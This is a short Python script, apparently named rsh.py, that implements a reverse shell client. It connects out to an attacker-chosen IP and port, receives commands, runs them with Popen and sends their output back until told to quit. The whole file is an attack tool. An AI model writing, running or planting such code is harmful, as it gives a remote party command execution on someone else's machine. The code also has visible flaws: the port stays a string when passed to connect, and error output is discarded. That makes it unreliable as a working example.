#!/usr/bin/python3.12
from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from subprocess import PIPE, Popen


def run(server_ip=argv[1], port=argv[2]):
    """Run script. Before use two arguments (IP and port). Ex: python rsh.py 192.168.0.1 8888. Works with IPv4."""
    try:
        rsh_client = socket(AF_INET, SOCK_STREAM)
        rsh_client.connect((server_ip, port))
        rsh_client.send("\tRSH is awaiting your commands!".encode())

        command = rsh_client.recv(4064).decode()
        while command != "quit":
            aux_proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
            result, err = aux_proc.communicate()
            rsh_client.send(result)
            command = rsh_client.recv(4064).decode()

        rsh_client.close()

    except ConnectionRefusedError:
        print("\n[-] Server is offline"
              "\n----------------------------------------------------------------")

    except PermissionError:
        print("\n[-] Server has left from session! Connection lost..."
              "\n----------------------------------------------------------------")


run()
